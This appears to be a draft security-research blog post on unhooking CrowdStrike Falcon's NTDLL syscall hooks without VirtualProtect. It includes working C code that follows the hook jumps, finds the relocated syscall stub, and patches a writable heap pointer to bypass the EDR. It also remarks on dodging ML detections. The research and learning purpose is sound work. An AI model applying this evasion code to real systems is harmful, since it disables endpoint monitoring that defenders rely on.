---
title: "EDR Unhooking: Patching Falcon without VirtualProtect"
date: 2023-07-07T23:52:33+01:00
draft: true
---

I recently encountered a [blog post](https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/)  by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby the jumps for hooks implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for `NtAllocateVirtualMemory`, for which the authors replace the EDR's hook with their own hook pointing to the relocated stub, unhooking the function and making it available for further unhooking.

For my own education and curiosity, I was keen to try out this approach with another EDR, Crowdstrike Falcon. I found that the hooking implementation of Falcon posed more challenges than that of Sophos (probably unsurprisingly), but with some hacky alternative approaches, I was able to achieve similar unhooking of NTDLL syscall stubs **without `VirtualProtect`**.

Two notes before I go through the approach:
1. This was a fun challenge, but I don't think this is really a practical approach - as will likely become apparent when looking at the steps. This is extremely targeted to a specific unhooking implementation, is not robust, and would just break if anything changed.
2. I'm going to just brush over the initial custom `GetModuleHandle/GetProcAddress` that are used to locate the function we want to unhook. These are pretty widely covered elsewhere - so much so that they trigger ML detections and need a little extra something to avoid this.


## Finding the relocated syscall stub.

So the first thing I wanted to do was find the relocated syscall stub.  In the Signal Labs blog, they find that the hooked function starts a direct `jmp` instruction, followed by an indirect `jmp` instruction that lands in the EDRs DLL. Once landed in this DLL, a pointer is loaded into `rax` which is then jumped to, leading to the relocated syscall stub.

Unfortunately in the case of Falcon, the stub wasn't quite so straightforward to find. As an example we'll have a look at trusty old `NtProtectVirtualMemory`.

The hook starts in the expected way. The initial `mov r10,rcx` call remains, followed by a `jmp` where we would usually expect the syscall SSN to be moved into `eax`.

![[Pasted image 20230707124440.png]]

Following the jump takes us to the `.text` section of `ntdll.dll` where we find a series of `push rcx` instructions, before an indirect jump is made to the Falcon DLL.

![[Pasted image 20230707124825.png]]

When we land in this DLL, we find 3 instructions before another jump. We firstly take a value and store it in `r10`, move another value from memory into `eax`, and finally XOR the `r10` value with a third value in memory.

![[Pasted image 20230707125216.png]]

This jump lands just above where we previously were. Here there's a loop, which we'll come back to later, that modifies the value in `r10`, which is then also jumped to - and at this point, we'll stop following the jumps.

![[Pasted image 20230707125441.png]]

Unlike the Sophos example, there isn't a quickly encountered jump to the relocated syscall stub here, so what other options do we have?

Well, we know what address the relocated syscall stub is going to jump back to at some point... the address that follows the original hook. We can just search through the relevant sections of allocated memory looking for that address - it's crude, but works.

### Implementation

So to start with, once we've got the address of the ntdll function using some version of `GetModuleHandle/GetProcAddress`, we can check whether it is likely to be hooked by the presence of a `jmp` following the initial `mov r10, rcx`. We don't know what type of `jmp` might be used, so we account for the range of `jmp` opcodes.

```c
VOID * FindHook(VOID * pFunc, LPCSTR pFuncName) {
    BYTE * firstByte = (BYTE *) pFunc;

    // Crude check for mov r10,rcx to determine whether function is syscall stub, or fully implemented in module
    if (
        *firstByte != 0x4c ||
        *(firstByte + 1) != 0x8b ||
        *(firstByte + 2) != 0xd1
    ) {
        printf("[!] Unexpected bytes found at function starting at: %p\n", pFunc);
        return NULL;
    }

    BYTE * fourthByteAddr = firstByte + 3;
    if (
        *fourthByteAddr == 0xeb ||
        *fourthByteAddr == 0xe9 ||
        *fourthByteAddr == 0xff ||
        *fourthByteAddr == 0xea
    ) {
        return fourthByteAddr;
    } else {
        return NULL;
    }
}
```

We then need to resolve the `jmp` to know where it lands, and also grab the address of the instruction after the `jmp`, which will be the address that we are searching for in memory. We can combine these into a more generic function that can later be used for the same purpose.

```c
VOID * ResolveJmp(BYTE * jmpAddr, VOID ** nextInstructionOut) {
    BYTE jmpOp = *jmpAddr;

    if (jmpOp == 0xe9) {
        BYTE * nextInstruction = jmpAddr + 5;
        DWORD offset = *((DWORD *) (jmpAddr + 1));

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return nextInstruction + offset;
    }

    if (jmpOp == 0xff) {
        VOID * nextInstruction = jmpAddr + 6;
        VOID * addr = (VOID *) *((DWORDLONG *) nextInstruction);

        if (nextInstructionOut != NULL) {
            *nextInstructionOut = nextInstruction;
        }

        return addr;
    }

    // Other jmp opcodes...

    return NULL;
}
```

Now we know where the relocated stub is, we can search for it using `VirtualQueryEx` to loop over the pages within the virtual address space. We want to narrow things down a bit, so we can narrow the search down to memory that is `MEM_COMMIT`, `MEM_PRIVATE`, and `PAGE_EXECUTE_READ` (these were confirmed initially just using a debugger). We have to make sure at least that the section is committed and readable, otherwise we'll be dereferencing a null pointer and causing an error. The `jmp` to the address we are searching for is going to be in the middle of the relocated syscall stub, so we need to walk backwards to locate the initial `mov r10, rcx` that should indicate the start. We can return the SSN (it's not used later but could be useful if instead opting to direct syscall), and also the base address of the relocated stub. This will be where a patch would want to `jmp` to.


```c
WORD FindRelocatedStub(VOID * addrToFind, VOID ** unhookAddr) {
    MEMORY_BASIC_INFORMATION info;

    for (
        BYTE * p = NULL;
        VirtualQueryEx(GetCurrentProcess(), p, &info, sizeof(info)) == sizeof(info);
        p += info.RegionSize
    ) {
        // Memory sections we want to include. In the example case, the section is COMMITTED/PRIVATE/RX
        if (info.State != MEM_COMMIT || info.Type != MEM_PRIVATE || info.Protect != PAGE_EXECUTE_READ) {
            continue;
        }
        
        for (SIZE_T i = 0; i < (info.RegionSize - sizeof(VOID *)); i++) {
            VOID * checkBytes = (VOID *) *((DWORDLONG *) ((BYTE *) info.BaseAddress + i));

            if (checkBytes == addrToFind) {
                BYTE * finalJmpAddr = (BYTE *) info.BaseAddress + i;

                // Only walk back 100 bytes. If it's not found within that, we are probably in the wrong place.
                for (int backCounter = 1; backCounter < 100; backCounter++) {
                    if (
                        *((BYTE *) finalJmpAddr - backCounter) == 0x4c &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 1)) == 0x8b &&
                        *((BYTE *) ((finalJmpAddr - backCounter) + 2)) == 0xd1
                    ) { 
                        *unhookAddr = (BYTE *) finalJmpAddr - backCounter;
                        
                        WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 4));
                        return syscallID;
                    }
                }
            }
        }
    }

    return NULL;
}
```


## Where can we patch?

So we know the address of the relocated stub, but what can we actually patch in order to jump there? Back in the Signal Labs post, they simply mention "replacing the hooks from the EDR/AV with our own hook." In my case though, I found that this wasn't possible. Firstly, the initial hooks are located in the `.text` section of `ntdll.dll`, which isn't writable without calling `VirtualProtect` first. Secondly, the existing hooks were `E9` near jumps, which wouldn't put us in range of our relocated stub. I don't believe we wouldn't be able to patch in a far jump without mangling surrounding instructions.

Well, what about second `jmp`? That one is a far jump. Again though, this is still located inside the `.text` section of `ntdll.dll` and isn't writable. The `jmp` after this is located inside the Falcon DLL itself, and also isn't writable, as well as being a short jump. The next jump is interesting though - it is also located in the DLL `.text` section, so isn't directly writable, but it's jumping to a register, `r10`, and as we briefly covered early, this register is filled with a value from memory that undergoes some modification before being jumped to.

Let's cover again what's happening at this point:

1. After following the first `jmp` in the hook, we land amongst some `push rcx` instructions. Different function hooks land in different places in the series of `push rcx` instructions, adding some variety between hooked functions.
2. We then `jmp` again to a few instructions where `r10` is filled with a value from memory, and then is XOR'd with another value from memory. The resulting value is an address that is generally somewhere in some heap memory of the Falcon DLL.
3. We `jmp` again and land in a loop. This loop performs one iteration for every `rcx` value that was pushed to the stack after the first `jmp`. For every iteration of the loop, the value `0x45` is added to the address in `r10`.
4. At the end of the loop, we `jmp` to `r10 + 0x28`.

As mentioned, the final memory address that is loaded into the `jmp` is a section of heap memory, and happens to be writable. We can therefore work out where this address is through manually performing the steps listed above, write our relocated stub address to here, and the `jmp r10 + 0x28` will naturally jump to the relocated stub, load the SSN into `eax` before jumping back to after the hook.

Our function needs to:
1. Follow the first `jmp`
2. Count how many `push rcx` are performed
3. Follow the second `jmp`
4. Perform the XOR between the two values to get our initial stack address
5. Add `0x45` for however many `push rcx` we counted
6. Add `0x28` to account for the final addition in the jump
7. Write the address we found for the relocated stub to here

```c
BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
    DWORD_PTR * patchAddr = NULL;
    BYTE * nextLanding = NULL;
    BYTE * nextInstruction = NULL;
    BYTE * initialHeapAddr = NULL;
    VOID * xorAddr1 = NULL;
    VOID * xorAddr2 = NULL;
    DWORD offset = 0;
    int stackValCounter = 0;

    // Count how many pushes to the stack are made before the jump
    while (*landingAddr == 0x51) {
        stackValCounter++;
        landingAddr++;
    }

    nextLanding = ResolveJmp(landingAddr, NULL);
    if (nextLanding == NULL) {
        return FALSE;
    }

    // Find the starting value of the heap address, pre-modification by the loop
    // To do this we find the value moved into r10. This is the address of the next instruction + an offset
    offset = *((DWORD *) (nextLanding + 3));
    nextInstruction = nextLanding + 7;
    xorAddr1 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    // We then find the next value, which will be XOR'd with the first. We skip an instruction in the middle which isn't used in resolving the address.
    // Then it is also a case of the next instruction + an offset
    nextInstruction = nextInstruction + 6;
    offset = *((DWORD *) (nextInstruction + 3));
    nextInstruction = nextInstruction + 7;
    xorAddr2 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));

    // XORing the two values gives us the initial address on the heap, before any modifications
    initialHeapAddr = ((DWORDLONG) xorAddr1) ^ ((DWORDLONG) xorAddr2);

    // We then perform the same actions the loop does, adding 0x45 for each value previously pushed to the stack, and adding 0x28 on the end.
    patchAddr = initialHeapAddr + (0x45 * (stackValCounter)) + 0x28;

    *patchAddr = targetAddr;

    return TRUE;
}
```


And at this point, we should have successfully unhooked the function without using `VirtualProtect`. As mentioned already, this is obviously incredibly brittle because it's reversing a specific piece of obfuscation where any of the hardcoded values could easily change. We could dynamically resolve the value added in the loops and the final jump, in case it was changed. 